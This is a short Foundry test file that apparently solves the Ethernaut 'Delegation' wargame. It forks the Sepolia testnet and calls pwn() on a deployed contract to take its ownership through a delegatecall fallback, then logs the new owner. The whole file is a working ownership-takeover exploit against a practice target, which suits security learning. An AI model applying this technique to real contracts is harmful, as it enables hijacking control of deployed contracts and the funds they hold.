// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6614067);
    }

    function test_Increment() public {
        Delegation delegation = Delegation(0x4D4Eb62F71EC7A01D7336dB4871087C8bc8EA42c);

        // vm.prank(0xA6270E61a6485f649f7E18b6e9eBF4d1d184D69d);

        (bool success, bytes memory data) = 
            0x4D4Eb62F71EC7A01D7336dB4871087C8bc8EA42c.call(abi.encodeWithSignature("pwn()"));

        console.log(success);

        console.log(delegation.owner());

    }

}
